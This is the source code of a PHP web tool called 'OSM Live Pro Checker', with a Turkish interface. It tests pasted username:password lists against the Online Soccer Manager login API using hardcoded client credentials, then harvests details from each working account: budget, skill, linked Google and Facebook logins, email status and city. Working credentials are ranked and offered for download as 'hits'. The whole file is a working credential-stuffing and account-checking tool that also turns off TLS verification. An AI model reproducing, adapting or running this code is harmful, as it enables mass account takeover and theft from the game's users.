<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    
    $user = $_POST['user'] ?? '';
    $pass = $_POST['pass'] ?? '';

    function request($url, $post = null, $headers = []) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_ENCODING, ""); 
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }

    // 1. ADIM: Login
    $h1 = ["PlatformId: 14", "AppVersion: 3.240.2", "Content-Type: application/x-www-form-urlencoded"];
    $p1 = "userName=".urlencode($user)."&grant_type=password&client_id=jPs3vVbg4uYnxGoyunSiNf1nIqUJmSFnpqJSVgWrJleu6Ak7Ga&client_secret=ePOVDMfAvU8zcyfaxLMtqYSmND3n6vmmKx9ZlVnNGjGkzucMCt&password=".urlencode($pass);
    
    $res1 = request("https://web-api.onlinesoccermanager.com/api/token", $p1, $h1);
    $data1 = json_decode($res1, true);

    if (isset($data1['access_token'])) {
        $doğrulamamıoluryaofffyaaaahhhhhhhhhhh = $data1['access_token'];
        $hAuth = ["Authorization: Bearer " . $doğrulamamıoluryaofffyaaaahhhhhhhhhhh, "Platformid: 11", "Appversion: 3.241.1"];
        
        $yetooovallabakkkkyetooooo = request("https://web-api.onlinesoccermanager.com/api/v1.1/user?fields=Images%2CStats%2CConnections", null, $hAuth);
        
        preg_match('/"skillRating":(\d+)/', $yetooovallabakkkkyetooooo, $hayatlanbusugibigidiyorlanamınkoym);
        $sikimböğleolmaz = $hayatlanbusugibigidiyorlanamınkoym[1] ?? 0;

        $resAcc = request("https://web-api.onlinesoccermanager.com/api/v1/user/accounts", null, $hAuth);
        $u = json_decode($resAcc, true);

        echo json_encode([
            'status' => 'success',
            'user' => $user, 'pass' => $pass,
            'name' => $u['name'] ?? 'N/A',
            'email' => ($u['hasEmail'] ?? false) ? '✔' : '✖',
            'google' => (strpos($yetooovallabakkkkyetooooo, '"type":2') !== false) ? '✔' : '✖',
            'facebook' => (strpos($yetooovallabakkkkyetooooo, '"type":1') !== false) ? '✔' : '✖',
            'city' => $u['city'] ?? 'Bilinmiyor',
            'budget' => $u['budget'] ?? 0,
            'points' => $u['points'] ?? 0,
            'wins' => $u['wins'] ?? 0,
            'losses' => $u['losses'] ?? 0,
            'resigns' => $u['resignCount'] ?? 0,
            'rank' => $u['rank'] ?? 'N/A',
            'skill' => $sikimböğleolmaz
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>OSM Live Pro Checker</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #06090f; --card: #0d1117; --primary: #2f81f7; --success: #2ea043; --danger: #f85149; --border: #30363d; --text: #f0f6fc; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding: 20px; margin: 0; }
        .container { max-width: 1400px; margin: 0 auto; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        .header-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 12px; text-align: center; }
        .stat-card b { display: block; font-size: 24px; margin-top: 5px; }
        .main-grid { display: grid; grid-template-columns: 1fr 2.5fr; gap: 20px; }
        textarea { width: 100%; height: 250px; background: #161b22; border: 1px solid var(--border); border-radius: 10px; color: #58a6ff; padding: 10px; font-family: monospace; outline: none; margin-bottom: 10px; resize: none; }
        .scroll-box { height: 500px; overflow-y: auto; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 15px; padding: 15px; }
        .hit-item { background: var(--card); border: 1px solid var(--success); border-radius: 10px; padding: 15px; margin-bottom: 10px; position: relative; }
        .log-line { font-size: 11px; padding: 5px; border-bottom: 1px solid #21262d; display: flex; justify-content: space-between; }
        .btn { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; margin-bottom: 10px; transition: 0.3s; text-decoration: none; display: inline-block; text-align: center; }
        .btn-outline { background: transparent; border: 1px solid var(--border); width: auto; padding: 10px 20px; }
        .btn-outline:hover { background: var(--border); }
        .btn-danger { background: var(--danger); }
        .btn-success { background: var(--success); margin-bottom: 15px; }
        .tag { font-size: 10px; padding: 2px 5px; border-radius: 4px; background: #21262d; color: var(--text); }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <nav class="navbar">
        <div class="logo">
            <i class="fas fa-futbol" style="color:var(--primary)"></i>
            <span style="font-weight:800; margin-left: 8px;">OSM <span style="color:var(--primary)">LIVE</span> PRO</span>
        </div>
        <a href="index.php" class="btn btn-outline">
            <i class="fas fa-arrow-left"></i> GERİ DÖN
        </a>
    </nav>

    <div class="header-stats">
        <div class="stat-card" style="border-top: 4px solid var(--primary);">KALAN <b id="s_total">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--success);">HIT <b id="s_hit">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--danger);">FAIL <b id="s_fail">0</b></div>
    </div>

    <div class="main-grid">
        <div class="side-panel">
            <textarea id="accs" placeholder="Hesaplar (user:pass)"></textarea>
            <button id="actionBtn" onclick="toggleProcess()" class="btn">TARAMAYI BAŞLAT</button>
            <div class="scroll-box" id="fullLog" style="height: 300px;"></div>
        </div>

        <div class="hit-panel">
            <button onclick="downloadHits()" id="dlBtn" class="btn btn-success" style="display:none;">HİT HESAPLARI İNDİR (.TXT)</button>
            <div class="scroll-box" id="hitLog" style="height: 610px;"></div>
        </div>
    </div>
</div>

<script>
let hitList = [];
let isRunning = false;
const formatMoney = (num) => new Intl.NumberFormat('de-DE').format(num) + " €";

function downloadHits() {
    if(hitList.length === 0) return;
    let content = hitList.map(h => `${h.user}:${h.pass} | Bütçe: ${h.budget} | Skill: ${h.skill}`).join('\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `OSM_Hits_${new Date().getTime()}.txt`;
    a.click();
}

function renderHits() {
    hitList.sort((a, b) => b.budget - a.budget || b.skill - a.skill);
    const hitsBox = document.getElementById('hitLog');
    hitsBox.innerHTML = '';
    hitList.forEach(res => {
        hitsBox.innerHTML += `
        <div class="hit-item" style="animation: slideIn 0.3s ease;">
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <b style="color:var(--primary)">${res.user}:${res.pass}</b>
                <span class="tag">${res.city}</span>
            </div>
            <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:10px; font-size:11px;">
                <div><small style="display:block; color:#8b949e">MENAJER</small><b>${res.name}</b></div>
                <div><small style="display:block; color:#8b949e">BÜTÇE</small><b style="color:var(--success)">${formatMoney(res.budget)}</b></div>
                <div><small style="display:block; color:#8b949e">PUAN</small><b>${formatMoney(res.points).replace('€','')}</b></div>
                <div><small style="display:block; color:#8b949e">SKILL</small><b style="color:orange">${res.skill}</b></div>
                <div><small style="display:block; color:#8b949e">GOOGLE</small><b>${res.google}</b></div>
                <div><small style="display:block; color:#8b949e">FACEBOOK</small><b>${res.facebook}</b></div>
                <div><small style="display:block; color:#8b949e">MAIL</small><b>${res.email}</b></div>
                <div><small style="display:block; color:#8b949e">G/M/İ</small><b>${res.wins}/${res.losses}/${res.resigns}</b></div>
            </div>
        </div>`;
    });
}

function toggleProcess() {
    if (isRunning) {
        isRunning = false;
        document.getElementById('actionBtn').innerText = "TARAMAYI BAŞLAT";
        document.getElementById('actionBtn').classList.remove('btn-danger');
    } else {
        process();
    }
}

async function process() {
    const accs = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));

    if(!accs.length) return alert("Hesap listesi boş!");

    isRunning = true;
    const btn = document.getElementById('actionBtn');
    btn.innerText = "DURDUR";
    btn.classList.add('btn-danger');

    let hits = 0, fails = 0;
    hitList = [];

    for (let i = 0; i < accs.length; i++) {
        if (!isRunning) break;

        document.getElementById('s_total').innerText = accs.length - i;
        const [u, p] = accs[i].trim().split(':');

        const fd = new FormData();
        fd.append('user', u); fd.append('pass', p);

        try {
            const response = await fetch('?action=check', { method: 'POST', body: fd });
            const res = await response.json();
            const log = document.getElementById('fullLog');

            if(res.status === 'success') {
                hits++; 
                document.getElementById('s_hit').innerText = hits;
                document.getElementById('dlBtn').style.display = 'block';
                log.innerHTML = `<div class="log-line"><span style="color:var(--success)">[HIT] ${u}</span> <span>${formatMoney(res.budget)}</span></div>` + log.innerHTML;
                hitList.push(res);
                renderHits();
            } else {
                fails++; 
                document.getElementById('s_fail').innerText = fails;
                log.innerHTML = `<div class="log-line"><span style="color:var(--danger)">[FAIL] ${u}</span></div>` + log.innerHTML;
            }
        } catch (e) { console.error(e); }
    }

    isRunning = false;
    btn.innerText = "TARAMAYI BAŞLAT";
    btn.classList.remove('btn-danger');
    document.getElementById('s_total').innerText = "BİTTİ";
}
</script>
</body>
</html>